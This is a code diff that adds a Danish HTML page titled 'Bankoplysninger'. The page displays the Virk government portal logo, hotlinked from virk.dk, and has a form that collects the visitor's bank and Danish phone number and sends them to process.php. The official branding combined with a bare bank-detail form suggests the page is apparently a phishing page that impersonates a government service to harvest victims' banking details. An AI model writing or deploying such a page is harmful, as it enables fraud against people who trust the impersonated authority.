@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <title>Bankoplysninger</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="https://www.virk.dk/-/media/project/brandguide/logos/virk-logo.svg" 
+                 alt="Virk Logo" 
+                 class="virk-logo">
+        </div>
+    </header>
+    <main>
+        <h1>Bankoplysninger</h1>
+        <form action="process.php" method="POST">
+            <label for="bank">Bank:</label>
+            <select id="bank" name="bank" required>
+                <option value="Danske Bank">Danske Bank</option>
+                <option value="Nordea">Nordea</option>
+                <option value="Swedbank">Swedbank</option>
+                <option value="Jyske Bank">Jyske Bank</option>
+            </select>
+            
+            <label for="phone">Telefonnummer:</label>
+            <input type="tel" id="phone" name="phone" pattern="^\+45\d{8}$" 
+                   placeholder="+4512345678" required>
+            
+            <button type="submit">Indsend</button>
+        </form>
+    </main>
+</body>
+</html>
